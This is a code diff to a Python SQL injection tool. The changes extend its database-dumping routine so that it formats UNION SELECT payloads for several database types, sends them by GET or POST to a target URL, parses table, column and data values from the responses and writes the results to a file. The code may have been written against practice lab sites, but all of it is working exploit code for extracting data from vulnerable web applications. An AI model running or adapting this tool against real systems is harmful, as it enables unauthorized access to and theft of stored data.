@@ -212,7 +212,7 @@ def download_info(url, data, method="GET", forms=False):
 
     if inj_type == 0:
         print("Without a good check cannot dump the database")
-        return
+        quit()
     if inj_type == 1: injes = inject_dump["sql"]
     if inj_type == 2: injes = inject_dump["hsqldb_n"]
     if inj_type == 3: injes = inject_dump["hsqldb"]
@@ -273,36 +273,45 @@ def download_info(url, data, method="GET", forms=False):
         col = p.split("holi")
         info["columns"].append(col)
 
-    # Dump database
+    # Dump database (only have access in one of the webs)
     info["data"] = []
-    if inj_type == 1: # TODO for the other webs
-        for col in info["columns"]:
-            if col[0].isupper(): # Tables without access
-                break
-            payload = f"' UNION SELECT NULL, {col[1]} FROM {col[0]}; -- "
-            data[injes["key"]] = payload
+    for col in info["columns"]:
+        if col[0].isupper(): # Tables without access
+            continue
+        payload = injes["payload"].format(tab=col[0], col=col[1])
+        data[injes["key"]] = payload
+        if method == "GET":
             soup = bs(s.get(url, params=data).content, "html.parser")
-            for pre in soup.find_all("pre"):
-                entry = []
-                entry.append(col[1])
-                entry.append(pre.text[pre.text.find("Surname: ") + len("Surname: "):])
-                info["data"].append(entry)
+        else:
+            soup = bs(s.post(url, data=data).content, "html.parser")
+        pieces = soup.text.split("hola")
+        for p in pieces[1::2]:
+            if p.find(f"',{col[1]},'") != -1:
+                continue
+            entry = []
+            entry.append(col[1])
+            entry.append(p)
+            info["data"].append(entry)
 
     return info
 
 def save_info(info, filename):
     with open(filename, "w") as f:
-        f.write(f"DATABASE VERSION: {info['version']}\n")
-        f.write(f"DATABASE NAME: {info['database']}\n")
-        f.write("\nTABLES NAMES:\n")
-        for t in info["tables"]:
-            f.write(f"{t}\n")
-        f.write("\nCOLUMNS NAMES:\n")
-        for c in info["columns"]:
-            f.write(f"TABLE: {c[0]:<25} COLUMN: {c[1]}\n")
-        f.write(f"\nDUMP DATA:\n")
-        for d in info["data"]:
-            f.write(f"COLUMN: {d[0]:<20} DATA: {d[1]}\n")
+        try:
+            f.write(f"DATABASE VERSION: {info['version']}\n")
+            f.write(f"DATABASE NAME: {info['database']}\n")
+            f.write("\nTABLES NAMES:\n")
+            for t in info["tables"]:
+                f.write(f"{t}\n")
+            f.write("\nCOLUMNS NAMES:\n")
+            for c in info["columns"]:
+                f.write(f"TABLE: {c[0]:<25} COLUMN: {c[1]}\n")
+            f.write(f"\nDUMP DATA:\n")
+            for d in info["data"]:
+                f.write(f"COLUMN: {d[0]:<20} DATA: {d[1]}\n")
+        except:
+            print("Dump sometimes doesn't work")
+            quit()
 
 
 def main():
